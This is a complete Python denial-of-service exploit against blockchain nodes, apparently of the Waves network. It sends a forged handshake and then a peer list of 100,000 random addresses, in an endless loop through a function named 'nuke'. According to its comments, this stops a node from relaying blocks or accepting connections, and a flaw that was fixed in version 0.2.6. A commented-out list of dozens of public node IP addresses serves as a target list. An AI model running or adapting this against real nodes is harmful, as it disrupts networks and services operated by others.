#!/usr/bin/python3

# Fixed in 0.2.6
#
# This exploit connects to a node on p2p port and sends 100000 random peers.
# I don't know why, but this procedure turns the node into a mindless zombie. The node stops relaying blocks and accepting new connections.
# Also, it doesn't respond to /peers/connected

import socket, time
from multiprocessing import Pool
from pyblake2 import blake2b
import struct
import random

#nodes = ['190.10.8.150', '45.63.89.38', '159.203.187.109', '138.201.247.72', '104.250.143.14', '178.21.118.37', '86.93.11.119', '139.59.185.243', '139.59.165.114', '134.249.124.17', '84.238.148.25', '95.183.48.178', '178.21.112.237', '83.149.244.156', '163.172.144.233', '139.59.213.17', '94.244.45.137', '193.124.182.142', '104.198.8.205', '193.172.33.72', '94.127.219.245', '94.231.250.154', '82.8.59.60', '139.162.181.204', '51.255.46.133', '137.74.112.73', '193.124.182.134', '46.228.6.34', '139.162.172.252', '104.236.219.81', '137.74.112.39', '178.218.117.66', '42.93.36.86', '193.124.183.22', '88.76.155.85', '94.214.44.158', '193.124.180.82', '104.198.2.225', '195.91.176.86', '193.124.182.113', '52.30.47.67', '91.107.104.167', '130.211.240.10', '139.162.172.167', '159.203.186.143', '23.94.190.226', '190.10.8.74', '81.88.208.180', '193.124.183.83', '86.166.51.143', '78.63.207.76', '104.154.57.29']
nodes = ["127.0.0.1"]

TCP_PORT = 6863
BUFFER_SIZE = 1024

def generate_handshake():
    nonce = b""
    for i in range(8):
        nonce += bytearray((random.randint(0,255),))
    HANDSHAKE = b"""\x05\x77\x61\x76\x65\x73\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x00\
\x00\x04\x05\x62\x63\x64\x65\x76""" + nonce + b"""\
\x00\x00\x00\x00\x00\x00\x00\x00\
\x57\xda\x74\xf9"""
    return HANDSHAKE

def generate_message(msgCode, data):
    # Message:
    # Length - 4 bytes, 0x100000 is MAX
    # MAGIC - 4 bytes - \x12\x34\x56\x78
    # 
    # Message code - 1 byte
    # Data length - 4 bytes signed
    # Data checksum - 4 bytes - algorithm unknown
    # Data - length bytes

    MAGIC = b'\x12\x34\x56\x78'
    a=blake2b(digest_size=32);a.update(data);crc=a.digest()[:4]
    message_size = len(data) + len(MAGIC) + len(crc) + len(msgCode) + 4
    return struct.pack(">L", message_size) + MAGIC + msgCode + struct.pack(">L", len(data)) + crc + data

def generate_message_send_peers():
    # Data length - 4 bytes
    # For data_length:
    #   IP addr - 4 bytes
    #   port - 4 bytes??? [don't question it :-P]
    data = []
    peers = 100000
    for i in range(peers):
        data.append(bytearray((random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))))
        data.append(struct.pack(">L", random.randint(1, 65000)))
    data = b''.join(data)
    data = struct.pack(">L", peers) + data
    return generate_message(b'\x02', data)

def nuke(ip):
    while True:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip, TCP_PORT))
            s.send(generate_handshake())
            time.sleep(0.5)
            s.send(generate_message_send_peers())
            time.sleep(2)
            s.close()
        except: pass

p = Pool(len(nodes))
p.map(nuke, nodes)
time.sleep(666)
